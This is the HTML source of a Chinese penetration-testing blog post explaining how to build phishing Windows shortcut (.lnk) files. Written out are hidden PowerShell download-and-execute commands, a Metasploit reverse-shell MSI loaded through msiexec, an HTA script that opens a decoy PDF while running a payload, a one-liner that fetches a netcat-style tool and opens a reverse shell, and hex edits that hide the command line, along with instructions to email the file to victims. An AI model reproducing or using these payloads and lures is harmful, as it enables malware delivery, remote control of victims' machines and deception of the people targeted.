@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Lnk 钓鱼利用技巧：修改完成后，系统会自动根据所执行的程序更改图标，此时可以通过手动更改指定图标，让文件看起来无害。 创建一个Lnk(快捷方式)文件，然后修改它的目标地址如下： 1234567891011# 方法一# powershell方式注入payload# 使用CS生成web投递：http:&#x2F;&#x2F;192.168.50.2:80&#x2F;apowershell.exe -nop -w hidden -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="钓鱼攻击之Lnk文件钓鱼">
+<meta property="og:url" content="http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/index.html">
+<meta property="og:site_name" content="踟蹰者的歌">
+<meta property="og:description" content="Lnk 钓鱼利用技巧：修改完成后，系统会自动根据所执行的程序更改图标，此时可以通过手动更改指定图标，让文件看起来无害。 创建一个Lnk(快捷方式)文件，然后修改它的目标地址如下： 1234567891011# 方法一# powershell方式注入payload# 使用CS生成web投递：http:&#x2F;&#x2F;192.168.50.2:80&#x2F;apowershell.exe -nop -w hidden -">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/01/29/rHySknal8uItUjh.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/29/e15TG7jXFpLtBV6.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/29/Ky4hAqjTRe3ctaV.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/29/iIbO2Un1hdB3u95.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/29/K2T7Vtmv3ZgQO5F.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/29/9uhlWASfJoOQz3K.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/29/2ZiUPN73KCnGJBw.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/29/jZPIRkdnxrAEVMt.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/29/GSKVveNifFUZ354.png">
+<meta property="article:published_time" content="2024-01-28T15:29:53.000Z">
+<meta property="article:modified_time" content="2024-01-29T09:21:30.030Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="Pentest">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/01/29/rHySknal8uItUjh.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>钓鱼攻击之Lnk文件钓鱼</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/01/28/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/01/27/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&text=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&title=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&is_video=false&description=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=钓鱼攻击之Lnk文件钓鱼&body=Check out this article: http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&title=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&title=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&title=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&title=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&name=钓鱼攻击之Lnk文件钓鱼&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&t=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Lnk-%E9%92%93%E9%B1%BC"><span class="toc-number">1.</span> <span class="toc-text">Lnk 钓鱼</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lnk-%E5%9B%BE%E6%A0%87%E5%A4%84%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">Lnk 图标处理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9B%B4%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">更进一步的利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PDF%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">PDF文件利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#txt%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">txt文件利用</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        钓鱼攻击之Lnk文件钓鱼
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-01-28T15:29:53.000Z" class="dt-published" itemprop="datePublished">2024-01-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Pentest/" rel="tag">Pentest</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Lnk-钓鱼"><a href="#Lnk-钓鱼" class="headerlink" title="Lnk 钓鱼"></a>Lnk 钓鱼</h1><p>利用技巧：修改完成后，系统会自动根据所执行的程序更改图标，此时可以通过手动更改指定图标，让文件看起来无害。</p>
+<p>创建一个Lnk(快捷方式)文件，然后修改它的目标地址如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法一</span></span><br><span class="line"><span class="comment"># powershell方式注入payload</span></span><br><span class="line"><span class="comment"># 使用CS生成web投递：http://192.168.50.2:80/a</span></span><br><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.50.2:80/a&#x27;))&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二</span></span><br><span class="line"><span class="comment"># 系统进程msiexec.exe是Windows Installer的一部分,利用此进程来加载我们shellcode还可以达到一定的规避作用。</span></span><br><span class="line"><span class="comment"># 使用MSF生成payload，并提供下载：</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.50.2 lport=4444 -f msi &gt; shell.txt</span><br><span class="line"><span class="comment"># 利用payload</span></span><br><span class="line">C:\Windows\System32\msiexec.exe /q /i http://192.168.50.2:8080/shell.txt</span><br></pre></td></tr></table></figure>
+
+<p>修改Lnk文件图标：推荐使用系统图标，避免当替换的图片在⽬标机器上不存在时，出现空⽩图标。可以在链接<code>%SystemRoot%\System32\SHELL32.dll</code>中查找。</p>
+<p>CS里新建一个HTTP listener，然后将生成的钓鱼链接给放到快捷方式的目的地址里</p>
+<p><a href="https://smms.app/image/rHySknal8uItUjh" target="_blank"><img src="https://s2.loli.net/2024/01/29/rHySknal8uItUjh.png" ></a></p>
+<p>诱使在目标系统上打开该快捷方式，即可成功上线</p>
+<h1 id="Lnk-图标处理"><a href="#Lnk-图标处理" class="headerlink" title="Lnk 图标处理"></a>Lnk 图标处理</h1><p>使用010editor</p>
+<p>选择一个系统图标，在lnk文件中的变化主要体现在：</p>
+<p><code>ShellLinkHeader</code>的<code>LinkFlags</code>结构体中的<code>HasIconLocation</code>标志位置为1，表示可以通过路径来检索图标</p>
+<p><a href="https://smms.app/image/e15TG7jXFpLtBV6" target="_blank"><img src="https://s2.loli.net/2024/01/29/e15TG7jXFpLtBV6.png" ></a></p>
+<p>最后是紧接在<code>COMMAND_LINE_ARGUMENTS</code>后的<code>ICON_LOCATION</code>字段，lnk使用的icon所在的文件，本例中是<code>%systemroot%\system32\shell32.dll</code></p>
+<p><a href="https://smms.app/image/Ky4hAqjTRe3ctaV" target="_blank"><img src="https://s2.loli.net/2024/01/29/Ky4hAqjTRe3ctaV.png" ></a></p>
+<p>这里只需要修改这个字段为.\1.pdf，建议直接改二进制码，为07002E005C0031002E00700064006600</p>
+<p><a href="https://smms.app/image/iIbO2Un1hdB3u95" target="_blank"><img src="https://s2.loli.net/2024/01/29/iIbO2Un1hdB3u95.png" ></a></p>
+<p>要想修改lnk指向的应用程序工作在指定目录，可以在<code>WORKING_DIR</code>字段进行修改，如果要去除该字段，可以设置<code>sLinkInfo</code>字段中的<code>HasWorkingDir</code>为0，并删除<code>WORKING_DIR</code>字段，则lnk启动的程序工作目录将在当前窗口。</p>
+<h1 id="更进一步的利用方式"><a href="#更进一步的利用方式" class="headerlink" title="更进一步的利用方式"></a>更进一步的利用方式</h1><p>当受害者中招打开我们的所谓的Lnk，实则为恶意的快捷⽅式时，双击两下，什么反应都没有，可能会有⼀丝疑惑，因此可以当尝试⽤powershell、mshta等⽅式上线时，我们可以更改如cobaltstrike⽣成的代码，加上⼀段⾃动下载打开⼀份真的文件，来达到逼真的效果。</p>
+<h2 id="PDF文件利用"><a href="#PDF文件利用" class="headerlink" title="PDF文件利用"></a>PDF文件利用</h2><p>首先生成HTA后门文件</p>
+<p>然后在HTA文件执行Payload前添加如下语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim open_pdf</span><br><span class="line">		Set open_pdf = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">		open_pdf.run &quot;powershell -nop -w hidden (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.200.130:8080/1.pdf&#x27;,$env:temp+&#x27;/关于青铜段位集体下岗的通知.pdf&#x27;);Start-Process $env:temp&#x27;/关于青铜段位集体下岗的通知.pdf&#x27;&quot;, 0, true</span><br></pre></td></tr></table></figure>
+
+<p><code>关于青铜段位集体下岗的通知.pdf</code>为正常的PDF文档，是双击快捷方式后打开的那个正常的文档，需要开启httpserver，server上的pdf命名为1.pdf。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">	Function var_func()</span><br><span class="line">		Dim var_shell</span><br><span class="line">		Dim open_pdf</span><br><span class="line">		Set open_pdf = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">		open_pdf.run &quot;powershell -nop -w hidden (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.200.130:8080/1.pdf&#x27;,$env:temp+&#x27;/关于青铜段位集体下岗的通知.pdf&#x27;);Start-Process $env:temp&#x27;/关于青铜段位集体下岗的通知.pdf&#x27;&quot;, 0, true</span><br><span class="line">		Set var_shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">		var_shell.run &quot;powershell -nop -w hidden -encodedcommand ...&quot;, 0, true</span><br><span class="line">	End Function</span><br><span class="line"></span><br><span class="line">	var_func</span><br><span class="line">	self.close</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>生成HTA文件下载地址：<code>http://192.168.200.130:1080/关于青铜段位集体下岗的通知.pdf</code></p>
+<p><a href="https://smms.app/image/K2T7Vtmv3ZgQO5F" target="_blank"><img src="https://s2.loli.net/2024/01/29/K2T7Vtmv3ZgQO5F.png" ></a></p>
+<p>新建一个指向<code>%windir%\System32\mshta.exe</code>的快捷方式，并更改其图标为<code>%SystemRoot%\System32\SHELL32.dll</code>中的一个，然后修改为pdf的快捷方式</p>
+<p>更改快捷文件的参数为HTA下载地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%windir%\System32\mshta.exe http://192.168.200.130:1080/关于青铜段位集体下岗的通知.pdf</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://smms.app/image/9uhlWASfJoOQz3K" target="_blank"><img src="https://s2.loli.net/2024/01/29/9uhlWASfJoOQz3K.png" ></a></p>
+<p>利用邮箱lnk文件发送到目标用户，之后双击该LNK文件，主机便会上线，而受害者会看到一正常的PDF文档</p>
+<p><a href="https://smms.app/image/2ZiUPN73KCnGJBw" target="_blank"><img src="https://s2.loli.net/2024/01/29/2ZiUPN73KCnGJBw.png" ></a></p>
+<p>还可以将关于青铜段位集体下岗的通知.lnk与真实的PDF文档捆绑，使其文件大小看起来更具有迷惑性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b xxx.lnk + xxx.pdf xxx.lnk</span><br></pre></td></tr></table></figure>
+
+<h2 id="txt文件利用"><a href="#txt文件利用" class="headerlink" title="txt文件利用"></a>txt文件利用</h2><p>工具地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/k8gege/Ladon</span><br></pre></td></tr></table></figure>
+
+<p>payload如下</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c (<span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt;C:\Users\Public\passwd.txt &amp; <span class="built_in">start</span> /b C:\Users\Public\passwd.txt) &amp; (powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="built_in">iwr</span> <span class="literal">-outf</span> C:\Users\Public\nc.exe http://<span class="number">192.168</span>.<span class="number">200.130</span>:<span class="number">8080</span>/nc.exe &amp; C:\Users\Public\nc.exe ReverseTcp <span class="number">192.168</span>.<span class="number">200.130</span> <span class="number">4444</span> nc)</span><br></pre></td></tr></table></figure>
+
+<p>上面这一串cmd命令的意思是把“hello”写入C:\Users\Public\password.txt，并打开这个文件，然后从外部服务器上下载nc.exe到C:\Users\Public目录下，并命名为nc.exe，最后执行”nc.exe ReverseTcp 192.168.200.130 4444 nc” 反弹shell到192.168.200.130上。</p>
+<p><code>cmd /c</code> ：执行完命令后关闭命令窗口</p>
+<p>此处<code>http://192.168.200.130:8080/nc.exe</code>实为<code>Ladon.exe</code></p>
+<p>新建一个指向<code>%windir%\System32\cmd.exe</code>的快捷方式，并更改其图标为<code>%SystemRoot%\System32\SHELL32.dll</code>中的一个</p>
+<p>使用010 Editor修改Lnk文件</p>
+<p>可以看到实际上<code>COMMAND_LINE_ARGUMENTS</code>的长度可以支持到16-bit大小（0xffff），修改成大于260的值。</p>
+<p>然后在其后插入大于所增大字节数量（因为支持的是Unicode格式字符）的空白空间（点击ICON_LOCATION，然后ctrl+shift+I）</p>
+<p><a href="https://smms.app/image/jZPIRkdnxrAEVMt" target="_blank"><img src="https://s2.loli.net/2024/01/29/jZPIRkdnxrAEVMt.png" ></a></p>
+<p>删除<code>COMMAND_LINE_ARGUMENTS</code>与<code>ICON_LOCATION</code>之间多余的空白空间（ICON_LOCATION以1F004300开始），重新加载后可得以下内容</p>
+<p><a href="https://smms.app/image/GSKVveNifFUZ354" target="_blank"><img src="https://s2.loli.net/2024/01/29/GSKVveNifFUZ354.png" ></a></p>
+<p>然后丢给目标上线</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Lnk-%E9%92%93%E9%B1%BC"><span class="toc-number">1.</span> <span class="toc-text">Lnk 钓鱼</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lnk-%E5%9B%BE%E6%A0%87%E5%A4%84%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">Lnk 图标处理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9B%B4%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">更进一步的利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PDF%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">PDF文件利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#txt%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">txt文件利用</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&text=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&title=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&is_video=false&description=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=钓鱼攻击之Lnk文件钓鱼&body=Check out this article: http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&title=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&title=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&title=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&title=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&name=钓鱼攻击之Lnk文件钓鱼&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/01/28/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B9%8BLnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC/&t=钓鱼攻击之Lnk文件钓鱼"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
